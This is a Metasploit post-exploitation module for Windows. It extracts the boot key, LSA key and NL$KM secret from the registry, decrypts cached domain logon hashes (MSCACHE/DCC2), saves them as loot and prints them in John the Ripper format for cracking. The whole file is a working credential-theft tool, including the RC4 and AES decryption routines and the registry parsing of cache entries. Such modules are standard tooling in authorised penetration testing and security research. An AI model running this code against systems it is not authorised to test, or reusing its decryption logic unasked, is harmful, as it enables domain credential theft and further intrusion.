##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'English'
class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Credential Cache Dump',
        'Description' => %q{
          This module uses the registry to extract the stored domain hashes that have been
          cached as a result of a GPO setting. The default setting on Windows is to store
          the last ten successful logins.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Maurizio Agazzini <inode[at]mediaservice.net>',
          'mubix'
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'References' => [
          ['URL', 'https://web.archive.org/web/20220407023137/https://lab.mediaservice.net/code/cachedump.rb']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_railgun_api
              stdapi_registry_open_key
            ]
          }
        }
      )
    )
  end

  def check_gpo
    gposetting = registry_getvaldata('HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 'CachedLogonsCount')
    print_status("Cached Credentials Setting: #{gposetting} - (Max is 50 and 0 disables, and 10 is default)")
  end

  def capture_nlkm(lsakey)
    nlkm = registry_getvaldata('HKLM\\SECURITY\\Policy\\Secrets\\NL$KM\\CurrVal', '')

    vprint_status("Encrypted NL$KM: #{nlkm.unpack('H*')[0]}")

    if lsa_vista_style?
      nlkm_dec = decrypt_lsa_data(nlkm, lsakey)
    elsif sysinfo['Architecture'] == ARCH_X64
      nlkm_dec = decrypt_secret_data(nlkm[0x10..], lsakey)
    else # 32 bits
      nlkm_dec = decrypt_secret_data(nlkm[0xC..], lsakey)
    end

    return nlkm_dec
  end

  def parse_decrypted_cache(dec_data, cache_entry)
    i = 0
    hash = dec_data[i, 0x10]
    i += 72

    username = dec_data[i, cache_entry.user_name_length].split("\x00\x00").first.gsub("\x00", '')
    i += cache_entry.user_name_length
    i += 2 * ((cache_entry.user_name_length / 2) % 2)

    vprint_good "Username\t\t: #{username}"
    vprint_good "Hash\t\t: #{hash.unpack('H*')[0]}"

    if lsa_vista_style?
      if (cache_entry.iteration_count > 10240)
        iteration_count = cache_entry.iteration_count & 0xfffffc00
      else
        iteration_count = cache_entry.iteration_count * 1024
      end
      vprint_good "Iteration count\t: #{cache_entry.iteration_count} -> real #{iteration_count}"
    end

    last = Time.at(cache_entry.last_access)
    vprint_good "Last login\t\t: #{last.strftime('%F %T')} "

    dec_data[i, cache_entry.domain_name_length + 1]
    i += cache_entry.domain_name_length

    if (cache_entry.dns_domain_name_length != 0)
      dns_domain_name = dec_data[i, cache_entry.dns_domain_name_length + 1].split("\x00\x00").first.gsub("\x00", '')
      i += cache_entry.dns_domain_name_length
      i += 2 * ((cache_entry.dns_domain_name_length / 2) % 2)
      vprint_good "DNS Domain Name\t: #{dns_domain_name}"
    end

    if (cache_entry.upn_length != 0)
      upn = dec_data[i, cache_entry.upn_length + 1].split("\x00\x00").first.gsub("\x00", '')
      i += cache_entry.upn_length
      i += 2 * ((cache_entry.upn_length / 2) % 2)
      vprint_good "UPN\t\t\t: #{upn}"
    end

    if (cache_entry.effective_name_length != 0)
      effective_name = dec_data[i, cache_entry.effective_name_length + 1].split("\x00\x00").first.gsub("\x00", '')
      i += cache_entry.effective_name_length
      i += 2 * ((cache_entry.effective_name_length / 2) % 2)
      vprint_good "Effective Name\t: #{effective_name}"
    end

    if (cache_entry.full_name_length != 0)
      full_name = dec_data[i, cache_entry.full_name_length + 1].split("\x00\x00").first.gsub("\x00", '')
      i += cache_entry.full_name_length
      i += 2 * ((cache_entry.full_name_length / 2) % 2)
      vprint_good "Full Name\t\t: #{full_name}"
    end

    if (cache_entry.logon_script_length != 0)
      logon_script = dec_data[i, cache_entry.logon_script_length + 1].split("\x00\x00").first.gsub("\x00", '')
      i += cache_entry.logon_script_length
      i += 2 * ((cache_entry.logon_script_length / 2) % 2)
      vprint_good "Logon Script\t\t: #{logon_script}"
    end

    if (cache_entry.profile_path_length != 0)
      profile_path = dec_data[i, cache_entry.profile_path_length + 1].split("\x00\x00").first.gsub("\x00", '')
      i += cache_entry.profile_path_length
      i += 2 * ((cache_entry.profile_path_length / 2) % 2)
      vprint_good "Profile Path\t\t: #{profile_path}"
    end

    if (cache_entry.home_directory_length != 0)
      home_directory = dec_data[i, cache_entry.home_directory_length + 1].split("\x00\x00").first.gsub("\x00", '')
      i += cache_entry.home_directory_length
      i += 2 * ((cache_entry.home_directory_length / 2) % 2)
      vprint_good "Home Directory\t\t: #{home_directory}"
    end

    if (cache_entry.home_directory_drive_length != 0)
      home_directory_drive = dec_data[i, cache_entry.home_directory_drive_length + 1].split("\x00\x00").first.gsub("\x00", '')
      i += cache_entry.home_directory_drive_length
      i += 2 * ((cache_entry.home_directory_drive_length / 2) % 2)
      vprint_good "Home Directory Drive\t: #{home_directory_drive}"
    end

    vprint_good "User ID\t\t: #{cache_entry.user_id}"
    vprint_good "Primary Group ID\t: #{cache_entry.primary_group_id}"

    relative_id = []
    while (cache_entry.group_count > 0)
      # TODO: parse attributes
      relative_id << dec_data[i, 4].unpack('V')[0]
      i += 4
      dec_data[i, 4].unpack('V')[0]
      i += 4
      cache_entry.group_count -= 1
    end

    vprint_good("Additional groups\t: #{relative_id.join ' '}")

    if cache_entry.logon_domain_name_length != 0
      logon_domain_name = dec_data[i, cache_entry.logon_domain_name_length + 1].split("\x00\x00").first.gsub("\x00", '')
      cache_entry.logon_domain_name_length
      cache_entry.logon_domain_name_length
      vprint_good "Logon domain name\t: #{logon_domain_name}"
    end

    @credentials <<
      [
        username,
        hash.unpack('H*')[0],
        iteration_count,
        logon_domain_name,
        dns_domain_name,
        last.strftime('%F %T'),
        upn,
        effective_name,
        full_name,
        logon_script,
        profile_path,
        home_directory,
        home_directory_drive,
        cache_entry.primary_group_id,
        relative_id.join(' '),
      ]

    vprint_good('----------------------------------------------------------------------')

    if lsa_vista_style?
      return "#{username.downcase}:$DCC2$#{iteration_count}##{username.downcase}##{hash.unpack('H*')[0]}:#{dns_domain_name}:#{logon_domain_name}\n"
    end

    "#{username.downcase}:M$#{username.downcase}##{hash.unpack('H*')[0]}:#{dns_domain_name}:#{logon_domain_name}\n"
  end

  def parse_cache_entry(cache_data)
    j = Struct.new(
      :user_name_length,
      :domain_name_length,
      :effective_name_length,
      :full_name_length,
      :logon_script_length,
      :profile_path_length,
      :home_directory_length,
      :home_directory_drive_length,
      :user_id,
      :primary_group_id,
      :group_count,
      :logon_domain_name_length,
      :logon_domain_id_length,
      :last_access,
      :last_access_time,
      :revision,
      :sid_count,
      :valid,
      :iteration_count,
      :sif_length,
      :logon_package,
      :dns_domain_name_length,
      :upn_length,
      :ch,
      :enc_data
    )

    s = j.new

    s.user_name_length = cache_data[0, 2].unpack('v')[0]
    s.domain_name_length = cache_data[2, 2].unpack('v')[0]
    s.effective_name_length = cache_data[4, 2].unpack('v')[0]
    s.full_name_length = cache_data[6, 2].unpack('v')[0]
    s.logon_script_length = cache_data[8, 2].unpack('v')[0]
    s.profile_path_length = cache_data[10, 2].unpack('v')[0]
    s.home_directory_length = cache_data[12, 2].unpack('v')[0]
    s.home_directory_drive_length = cache_data[14, 2].unpack('v')[0]

    s.user_id = cache_data[16, 4].unpack('V')[0]
    s.primary_group_id = cache_data[20, 4].unpack('V')[0]
    s.group_count = cache_data[24, 4].unpack('V')[0]
    s.logon_domain_name_length = cache_data[28, 2].unpack('v')[0]
    s.logon_domain_id_length = cache_data[30, 2].unpack('v')[0]

    # Removed ("Q") unpack and replaced as such
    thi = cache_data[32, 4].unpack('V')[0]
    tlo = cache_data[36, 4].unpack('V')[0]
    q = (tlo.to_s(16) + thi.to_s(16)).to_i(16)
    s.last_access = ((q / 10000000) - 11644473600)

    s.revision = cache_data[40, 4].unpack('V')[0]
    s.sid_count = cache_data[44, 4].unpack('V')[0]
    s.valid = cache_data[48, 2].unpack('v')[0]
    s.iteration_count = cache_data[50, 2].unpack('v')[0]
    s.sif_length = cache_data[52, 4].unpack('V')[0]

    s.logon_package = cache_data[56, 4].unpack('V')[0]
    s.dns_domain_name_length = cache_data[60, 2].unpack('v')[0]
    s.upn_length = cache_data[62, 2].unpack('v')[0]

    s.ch = cache_data[64, 16]
    s.enc_data = cache_data[96..]

    s
  end

  def decrypt_hash(edata, nlkm, ch)
    rc4key = OpenSSL::HMAC.digest(OpenSSL::Digest.new('md5'), nlkm, ch)
    rc4 = OpenSSL::Cipher.new('rc4')
    rc4.key = rc4key
    decrypted = rc4.update(edata)
    decrypted << rc4.final

    decrypted
  end

  def decrypt_hash_vista(edata, nlkm, ch)
    aes = OpenSSL::Cipher.new('aes-128-cbc')
    aes.decrypt
    aes.key = nlkm[16...32]
    aes.padding = 0
    aes.iv = ch

    decrypted = ''
    (0...edata.length).step(16) do |i|
      decrypted << aes.update(edata[i, 16])
    end

    decrypted
  end

  def run
    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
    print_status("Running module against #{hostname} (#{session.session_host})")

    @credentials = Rex::Text::Table.new(
      'Header' => 'MSCACHE Credentials',
      'Indent' => 1,
      'Columns' =>
      [
        'Username',
        'Hash',
        'Hash iteration count',
        'Logon Domain Name',
        'DNS Domain Name',
        'Last Login',
        'UPN',
        'Effective Name',
        'Full Name',
        'Logon Script',
        'Profile Path',
        'Home Directory',
        'HomeDir Drive',
        'Primary Group',
        'Additional Groups'
      ]
    )

    client.railgun.netapi32
    join_status = client.railgun.netapi32.NetGetJoinInformation(nil, 4, 4)['BufferType']

    if sysinfo['Architecture'] == ARCH_X64
      join_status &= 0x00000000ffffffff
    end

    if join_status != 3
      fail_with(Failure::NoTarget, 'System is not joined to a domain, exiting..')
    end

    # Check policy setting for cached creds
    check_gpo

    print_status('Obtaining boot key...')
    bootkey = capture_boot_key

    fail_with(Failure::Unknown, 'Could not retrieve boot key. Are you SYSTEM?') if bootkey.blank?

    vprint_status("Boot key: #{bootkey.unpack1('H*')}")

    print_status('Obtaining Lsa key...')
    lsa_key = capture_lsa_key(bootkey)

    fail_with(Failure::Unknown, 'Could not retrieve LSA key. Are you SYSTEM?') if lsa_key.blank?

    vprint_status("Lsa Key: #{lsa_key.unpack('H*')[0]}")

    print_status('Obtaining NL$KM...')
    nlkm = capture_nlkm(lsa_key)
    vprint_status("NL$KM: #{nlkm.unpack('H*')[0]}")

    print_status('Dumping cached credentials...')
    ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SECURITY\\Cache', KEY_READ)

    john = ''

    ok.enum_value.each do |usr|
      next unless usr.name.match(/^NL\$\d+$/)

      begin
        nl = ok.query_value(usr.name.to_s).data
      rescue StandardError
        next
      end

      cache = parse_cache_entry(nl)

      next unless (cache.user_name_length > 0)

      vprint_status("Reg entry: #{nl.unpack('H*')[0]}")
      vprint_status("Encrypted data: #{cache.enc_data.unpack('H*')[0]}")
      vprint_status("Ch:  #{cache.ch.unpack('H*')[0]}")

      if lsa_vista_style?
        dec_data = decrypt_hash_vista(cache.enc_data, nlkm, cache.ch)
      else
        dec_data = decrypt_hash(cache.enc_data, nlkm, cache.ch)
      end

      vprint_status("Decrypted data: #{dec_data.unpack('H*')[0]}")

      john << parse_decrypted_cache(dec_data, cache)
    end

    if @credentials.rows.empty?
      print_status('Found no cached credentials')
      return
    end

    if lsa_vista_style?
      print_status('Hash are in MSCACHE_VISTA format. (mscash2)')
      p = store_loot('mscache2.creds', 'text/csv', session, @credentials.to_csv, 'mscache2_credentials.txt', 'MSCACHE v2 Credentials')
      print_good("MSCACHE v2 saved in: #{p}")
      john = "# mscash2\n" + john
    else
      print_status('Hash are in MSCACHE format. (mscash)')
      p = store_loot('mscache.creds', 'text/csv', session, @credentials.to_csv, 'mscache_credentials.txt', 'MSCACHE v1 Credentials')
      print_good("MSCACHE v1 saved in: #{p}")
      john = "# mscash\n" + john
    end

    print_status('John the Ripper format:')
    print_line(john)
  rescue ::Interrupt
    raise $ERROR_INFO
  rescue ::Rex::Post::Meterpreter::RequestError => e
    print_error("Meterpreter Exception: #{e.class} #{e}")
    print_error('This script requires the use of a SYSTEM user context (hint: migrate into service process)')
  end
end
